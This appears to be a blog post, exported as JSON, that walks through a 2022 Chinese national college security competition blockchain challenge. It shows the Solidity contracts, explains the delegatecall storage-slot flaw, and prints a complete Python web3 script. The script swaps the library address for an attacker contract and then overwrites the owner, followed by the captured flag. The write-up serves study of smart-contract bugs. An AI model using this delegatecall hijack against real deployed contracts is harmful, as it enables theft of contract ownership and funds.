{"title":"The 15th National College Student Information Security Competition","uid":"7a7dc284a8f031161ea186b2342a420d","slug":"The 15th National College Student Information Security Competition","date":"2022-08-02T02:49:40.287Z","updated":"2022-08-02T02:49:40.287Z","comments":true,"path":"api/articles/The 15th National College Student Information Security Competition.json","keywords":null,"cover":[],"content":"<p> 周日打了一下2022国赛的区块链题目，拿出来分享一下</p>\n<span id=\"more\"></span>\n\n<h1 id=\"1-Code\"><a href=\"#1-Code\" class=\"headerlink\" title=\"1.Code\"></a>1.Code</h1><pre class=\"line-numbers language-solidity\" data-language=\"solidity\"><code class=\"language-solidity\"><span class=\"token keyword\">pragma</span> <span class=\"token keyword\">solidity</span> <span class=\"token operator\">^</span><span class=\"token version number\">0.4.26</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">contract</span> <span class=\"token class-name\">Lib</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token builtin\">uint</span> <span class=\"token keyword\">public</span> score<span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">function</span> <span class=\"token function\">setScore</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">uint</span> _score<span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token punctuation\">&#123;</span>\n        score <span class=\"token operator\">=</span> _score<span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span>\n <span class=\"token keyword\">pragma</span> <span class=\"token keyword\">solidity</span> <span class=\"token operator\">^</span><span class=\"token version number\">0.4.26</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">contract</span> <span class=\"token class-name\">HackMe</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token builtin\">address</span> <span class=\"token keyword\">public</span> lib<span class=\"token punctuation\">;</span>\n    <span class=\"token builtin\">address</span> <span class=\"token keyword\">public</span> owner<span class=\"token punctuation\">;</span>\n    <span class=\"token builtin\">uint</span> <span class=\"token keyword\">public</span> score<span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">constructor</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> _lib<span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token keyword\">payable</span><span class=\"token punctuation\">&#123;</span>\n        lib <span class=\"token operator\">=</span> _lib<span class=\"token punctuation\">;</span>\n        owner <span class=\"token operator\">=</span> msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token keyword\">function</span> <span class=\"token function\">setScore</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">uint</span> _score<span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token punctuation\">(</span><span class=\"token builtin\">bool</span> res<span class=\"token punctuation\">,</span> <span class=\"token punctuation\">)</span> <span class=\"token operator\">=</span> lib<span class=\"token punctuation\">.</span><span class=\"token function\">delegatecall</span><span class=\"token punctuation\">(</span>abi<span class=\"token punctuation\">.</span><span class=\"token function\">encodeWithSignature</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"setScore(uint256)\"</span><span class=\"token punctuation\">,</span> _score<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>res<span class=\"token punctuation\">,</span> <span class=\"token string\">\"Failed to delegatecall to lib\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>题目要求：owner值发生改变即可</p></blockquote>\n<h1 id=\"Analyze\"><a href=\"#Analyze\" class=\"headerlink\" title=\"Analyze\"></a>Analyze</h1><p>漏洞是比较基础的delegatecall漏洞，<strong>就是调用外部代码，执行环境却是在本合约</strong>，详情参考我之前写过的基础漏洞汇总，链接：<a href=\"https://bcyng-w.github.io/2022/04/10/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E%E6%B1%87%E6%80%BB/#more\">https://bcyng-w.github.io/2022/04/10/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E%E6%B1%87%E6%80%BB/#more</a></p>\n<p>调用两次setscore，第一次将lib转变为攻击合约，第二次调用攻击合约下的setscore修改对应slot1的值即可改变Hackme下owner的值。</p>\n<p>该题解锁钱包的方式比较特别，随机生成的账户没有私钥，而是用生成账户时的密码进行解锁账户，参考：<a href=\"https://blog.csdn.net/qq_41907714/article/details/106640274\">https://blog.csdn.net/qq_41907714/article/details/106640274</a></p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/bcYng-w/images1/img/202205311542169.png\"></p>\n<p>我在这里设置的密码是123</p>\n<p>使用的解锁方法</p>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\">w3<span class=\"token punctuation\">.</span>geth<span class=\"token punctuation\">.</span>personal<span class=\"token punctuation\">.</span>unlockAccount<span class=\"token punctuation\">(</span><span class=\"token string\">'0x0D7c2FB2B185e6633FC027eE2A37138661934026'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'123'</span><span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<h1 id=\"Attack\"><a href=\"#Attack\" class=\"headerlink\" title=\"Attack\"></a>Attack</h1><p>最后附上攻击脚本</p>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token keyword\">from</span> web3 <span class=\"token keyword\">import</span> Web3<span class=\"token punctuation\">,</span>HTTPProvider\n<span class=\"token keyword\">from</span> time <span class=\"token keyword\">import</span> sleep\nw3<span class=\"token operator\">=</span>Web3<span class=\"token punctuation\">(</span>HTTPProvider<span class=\"token punctuation\">(</span><span class=\"token string\">'http://47.104.106.8:8545'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\nhacksabi<span class=\"token operator\">=</span><span class=\"token triple-quoted-string string\">'''\n[\n\t&#123;\n\t\t\"constant\": false,\n\t\t\"inputs\": [\n\t\t\t&#123;\n\t\t\t\t\"name\": \"_score\",\n\t\t\t\t\"type\": \"uint256\"\n\t\t\t&#125;\n\t\t],\n\t\t\"name\": \"setScore\",\n\t\t\"outputs\": [],\n\t\t\"payable\": false,\n\t\t\"stateMutability\": \"nonpayable\",\n\t\t\"type\": \"function\"\n\t&#125;,\n\t&#123;\n\t\t\"inputs\": [\n\t\t\t&#123;\n\t\t\t\t\"name\": \"_lib\",\n\t\t\t\t\"type\": \"address\"\n\t\t\t&#125;\n\t\t],\n\t\t\"payable\": true,\n\t\t\"stateMutability\": \"payable\",\n\t\t\"type\": \"constructor\"\n\t&#125;,\n\t&#123;\n\t\t\"constant\": true,\n\t\t\"inputs\": [],\n\t\t\"name\": \"lib\",\n\t\t\"outputs\": [\n\t\t\t&#123;\n\t\t\t\t\"name\": \"\",\n\t\t\t\t\"type\": \"address\"\n\t\t\t&#125;\n\t\t],\n\t\t\"payable\": false,\n\t\t\"stateMutability\": \"view\",\n\t\t\"type\": \"function\"\n\t&#125;,\n\t&#123;\n\t\t\"constant\": true,\n\t\t\"inputs\": [],\n\t\t\"name\": \"owner\",\n\t\t\"outputs\": [\n\t\t\t&#123;\n\t\t\t\t\"name\": \"\",\n\t\t\t\t\"type\": \"address\"\n\t\t\t&#125;\n\t\t],\n\t\t\"payable\": false,\n\t\t\"stateMutability\": \"view\",\n\t\t\"type\": \"function\"\n\t&#125;,\n\t&#123;\n\t\t\"constant\": true,\n\t\t\"inputs\": [],\n\t\t\"name\": \"score\",\n\t\t\"outputs\": [\n\t\t\t&#123;\n\t\t\t\t\"name\": \"\",\n\t\t\t\t\"type\": \"uint256\"\n\t\t\t&#125;\n\t\t],\n\t\t\"payable\": false,\n\t\t\"stateMutability\": \"view\",\n\t\t\"type\": \"function\"\n\t&#125;\n]\n'''</span>\nhackersabi<span class=\"token operator\">=</span><span class=\"token triple-quoted-string string\">'''\n[\n\t&#123;\n\t\t\"constant\": false,\n\t\t\"inputs\": [\n\t\t\t&#123;\n\t\t\t\t\"name\": \"_score\",\n\t\t\t\t\"type\": \"uint256\"\n\t\t\t&#125;\n\t\t],\n\t\t\"name\": \"setScore\",\n\t\t\"outputs\": [],\n\t\t\"payable\": false,\n\t\t\"stateMutability\": \"nonpayable\",\n\t\t\"type\": \"function\"\n\t&#125;,\n\t&#123;\n\t\t\"constant\": true,\n\t\t\"inputs\": [],\n\t\t\"name\": \"score\",\n\t\t\"outputs\": [\n\t\t\t&#123;\n\t\t\t\t\"name\": \"\",\n\t\t\t\t\"type\": \"uint256\"\n\t\t\t&#125;\n\t\t],\n\t\t\"payable\": false,\n\t\t\"stateMutability\": \"view\",\n\t\t\"type\": \"function\"\n\t&#125;,\n\t&#123;\n\t\t\"inputs\": [],\n\t\t\"payable\": false,\n\t\t\"stateMutability\": \"nonpayable\",\n\t\t\"type\": \"constructor\"\n\t&#125;\n]\n'''</span>\n\nres<span class=\"token operator\">=</span>w3<span class=\"token punctuation\">.</span>geth<span class=\"token punctuation\">.</span>personal<span class=\"token punctuation\">.</span>unlockAccount<span class=\"token punctuation\">(</span><span class=\"token string\">'0x0D7c2FB2B185e6633FC027eE2A37138661934026'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'123'</span><span class=\"token punctuation\">)</span>\naccount<span class=\"token operator\">=</span>w3<span class=\"token punctuation\">.</span>toChecksumAddress<span class=\"token punctuation\">(</span><span class=\"token string\">'0x0D7c2FB2B185e6633FC027eE2A37138661934026'</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>w3<span class=\"token punctuation\">.</span>eth<span class=\"token punctuation\">.</span>getBalance<span class=\"token punctuation\">(</span>account<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\nhachsaddress<span class=\"token operator\">=</span><span class=\"token string\">'0x73d7c98126aaC3e9dd5f4c4957a07fB05f5e8EB2'</span>\nhackscontract<span class=\"token operator\">=</span>w3<span class=\"token punctuation\">.</span>eth<span class=\"token punctuation\">.</span>contract<span class=\"token punctuation\">(</span>abi<span class=\"token operator\">=</span>hacksabi<span class=\"token punctuation\">,</span>address<span class=\"token operator\">=</span>hachsaddress<span class=\"token punctuation\">)</span>\ncode<span class=\"token operator\">=</span><span class=\"token string\">'608060405234801561001057600080fd5b5060dc8061001f6000396000f3006080604052600436106049576000357c0100000000000000000000000000000000000000000000000000000000900463ffffffff168063422beeba14604e578063efedc669146078575b600080fd5b348015605957600080fd5b5060766004803603810190808035906020019092919050505060a0565b005b348015608357600080fd5b50608a60aa565b6040518082815260200191505060405180910390f35b8060018190555050565b600154815600a165627a7a72305820282edb4b675a8fb6d0eb1ab79325fc438b3ae4f8c9b27a3ad1690ef7704b531e0029'</span>\nhackerscontract<span class=\"token operator\">=</span>w3<span class=\"token punctuation\">.</span>eth<span class=\"token punctuation\">.</span>contract<span class=\"token punctuation\">(</span>abi<span class=\"token operator\">=</span>hackersabi<span class=\"token punctuation\">,</span>bytecode<span class=\"token operator\">=</span>code<span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># constructor_txn=hackerscontract.constructor().buildTransaction(&#123;</span>\n<span class=\"token comment\">#     'from': account,</span>\n<span class=\"token comment\">#     'gas': 1000000</span>\n<span class=\"token comment\">#     &#125;)</span>\n\n<span class=\"token comment\"># tx_id=w3.eth.sendTransaction(constructor_txn)</span>\n<span class=\"token comment\"># print(tx_id.hex())</span>\n<span class=\"token comment\"># sleep(5)</span>\n<span class=\"token comment\"># a=w3.eth.getTransactionReceipt(tx_id).contractAddress</span>\n<span class=\"token comment\"># sleep(5)</span>\n<span class=\"token comment\"># print(a)</span>\nstep1_txn<span class=\"token operator\">=</span>hackscontract<span class=\"token punctuation\">.</span>functions<span class=\"token punctuation\">.</span>setScore<span class=\"token punctuation\">(</span><span class=\"token number\">0xBD6Ab56B2C74BDD3aBcf197af0Ff9e08F7F41a2D</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>buildTransaction<span class=\"token punctuation\">(</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token string\">'from'</span><span class=\"token punctuation\">:</span>account<span class=\"token punctuation\">,</span>\n    <span class=\"token string\">'gas'</span><span class=\"token punctuation\">:</span> <span class=\"token number\">1000000</span>\n    <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span>\ntx_id1<span class=\"token operator\">=</span>w3<span class=\"token punctuation\">.</span>eth<span class=\"token punctuation\">.</span>sendTransaction<span class=\"token punctuation\">(</span>step1_txn<span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>tx_id1<span class=\"token punctuation\">)</span>\nsleep<span class=\"token punctuation\">(</span><span class=\"token number\">5</span><span class=\"token punctuation\">)</span>\nstep2_txn<span class=\"token operator\">=</span>hackscontract<span class=\"token punctuation\">.</span>functions<span class=\"token punctuation\">.</span>setScore<span class=\"token punctuation\">(</span><span class=\"token number\">0x03C6FcED478cBbC9a4FAB34eF9f40767739D1Ff7</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>buildTransaction<span class=\"token punctuation\">(</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token string\">'from'</span><span class=\"token punctuation\">:</span>account<span class=\"token punctuation\">,</span>\n    <span class=\"token string\">'gas'</span><span class=\"token punctuation\">:</span> <span class=\"token number\">1000000</span>\n    <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span>\ntx_id2<span class=\"token operator\">=</span>w3<span class=\"token punctuation\">.</span>eth<span class=\"token punctuation\">.</span>sendTransaction<span class=\"token punctuation\">(</span>step2_txn<span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>tx_id2<span class=\"token punctuation\">)</span>\n<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>代码分段运行，先注释掉攻击部份，部署攻击合约，获得合约地址后作为攻击脚本的参数进行攻击，运行结束后，再cmd终端输入4检查攻击是否成功。</p>\n<p>获得flag：<strong>flag:{23d1eb0e-e1f5-4a86-b722-690135f0377a}</strong></p>\n","text":" 周日打了一下2022国赛的区块链题目，拿出来分享一下 1.Codepragma solidity ^0.4.26; contract Lib &#123; uint public score; function setScore(uint _score) public &#12...","link":"","photos":[],"count_time":{"symbolsCount":"4.7k","symbolsTime":"4 mins."},"categories":[],"tags":[{"name":"区块链","slug":"区块链","count":17,"path":"api/tags/区块链.json"}],"toc":"<ol class=\"toc\"><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#1-Code\"><span class=\"toc-text\">1.Code</span></a></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#Analyze\"><span class=\"toc-text\">Analyze</span></a></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#Attack\"><span class=\"toc-text\">Attack</span></a></li></ol>","author":{"name":"bcYng","slug":"blog-author","avatar":"https://cdn.jsdelivr.net/gh/bcYng-image/image/img/296321666270692_.pic.jpg","link":"/","description":"A rookie focused on blockchain security","socials":{"github":"https://github.com/bcYng-w","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}},"mapped":true,"prev_post":{"title":"BlockSec interview questions","uid":"c4192ee28bd2d2701353c24c31e1eb4a","slug":"BlockSec interview questions","date":"2022-08-02T02:51:50.704Z","updated":"2022-08-02T02:51:50.704Z","comments":true,"path":"api/articles/BlockSec interview questions.json","keywords":null,"cover":[],"text":" 1.任务 任务要求：用brownie（python）或者hardhat（js）这种框架，用alchemy提供的历史数据功能，写一个在uniswap v2上借flash loan的合约，flash loan借出来之后用uniswap v3的router上做一次swap（unisw...","link":"","photos":[],"count_time":{"symbolsCount":"9.3k","symbolsTime":"8 mins."},"categories":[],"tags":[{"name":"private","slug":"private","count":1,"path":"api/tags/private.json"}],"author":{"name":"bcYng","slug":"blog-author","avatar":"https://cdn.jsdelivr.net/gh/bcYng-image/image/img/296321666270692_.pic.jpg","link":"/","description":"A rookie focused on blockchain security","socials":{"github":"https://github.com/bcYng-w","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}}},"next_post":{"title":"Damn Vulnerable Defi","uid":"3e4e5e9b128bda97a530bf234e940a7f","slug":"Damn Vulnerable DeFi","date":"2022-08-02T02:49:20.316Z","updated":"2022-08-02T02:49:20.316Z","comments":true,"path":"api/articles/Damn Vulnerable DeFi.json","keywords":null,"cover":[],"text":" 地址：https://www.damnvulnerabledefi.xyz/ 1.Unstoppable 题目要求： There’s a lending pool with a million DVT tokens in balance, offering flash loan...","link":"","photos":[],"count_time":{"symbolsCount":"70k","symbolsTime":"1:03"},"categories":[],"tags":[{"name":"区块链","slug":"区块链","count":17,"path":"api/tags/区块链.json"}],"author":{"name":"bcYng","slug":"blog-author","avatar":"https://cdn.jsdelivr.net/gh/bcYng-image/image/img/296321666270692_.pic.jpg","link":"/","description":"A rookie focused on blockchain security","socials":{"github":"https://github.com/bcYng-w","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}}}}